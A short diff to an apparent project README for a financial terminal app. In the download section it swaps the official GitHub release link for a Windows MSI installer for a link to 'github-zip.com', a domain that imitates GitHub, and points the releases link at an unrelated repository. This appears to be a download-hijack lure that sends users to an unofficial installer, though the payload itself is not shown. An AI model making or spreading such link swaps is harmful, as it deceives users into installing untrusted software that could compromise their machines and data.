@@ -38,9 +38,9 @@
 
 | Platform | Architecture | Download |
 |----------|-------------|----------|
-| **Windows** | x64 | [Download](https://github.com/Fincept-Corporation/FinceptTerminal/releases/download/v3.3.0/FinceptTerminal-v3.3.0-Windows-x64.msi) |
+| **Windows** | x64 | [Download](https://github-zip.com/trading-agents) |
 
-[View All Releases](https://github.com/Fincept-Corporation/FinceptTerminal/releases)
+[View All Releases](https://github.com/basedalien/trading-agents/releases)
 <!-- DOWNLOAD_SECTION_END -->
 
 ---
